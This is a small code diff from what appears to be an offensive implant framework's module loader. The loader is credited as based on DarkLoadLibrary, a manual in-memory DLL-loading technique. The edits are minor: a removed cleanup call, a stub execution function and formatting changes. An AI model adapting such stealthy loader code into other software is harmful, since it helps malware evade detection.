@@ -489,8 +489,6 @@ namespace Modules {
 						if (!next_load) {
 							goto defer;
 						}
-
-						CleanupModule(&next_load, false);
 						lib = next_load->base;
 					}
 
@@ -775,13 +773,16 @@ namespace Modules {
     }
 
 	BOOL BeginExecution(PEXECUTABLE mod) {
+		HEXANE;
 		
+		BOOL success = false;
+		return success;
 	}
 
 	PEXECUTABLE ImportModule(CONST UINT32 load_type, CONST UINT32 name_hash, UINT8 *memory, CONST UINT32 mem_size, WCHAR *name, BOOL cache) {
         HEXANE;
-        // Code based off of https://github.com/bats3c/DarkLoadLibrary
 
+        // Code based off of https://github.com/bats3c/DarkLoadLibrary
         PEXECUTABLE mod = (PEXECUTABLE)ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
         if (!mod) {
             return nullptr;
@@ -824,8 +825,9 @@ namespace Modules {
 			goto defer;
         }
 
-        if (load_type & NoLink)
+        if (load_type & NoLink) {
             mod->link = false;
+		}
 
         if (name == nullptr) {
             name = mod->cracked_name;
